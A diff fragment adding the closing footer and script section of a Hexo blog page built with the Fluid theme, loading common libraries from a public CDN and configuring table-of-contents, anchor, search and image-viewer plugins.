+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
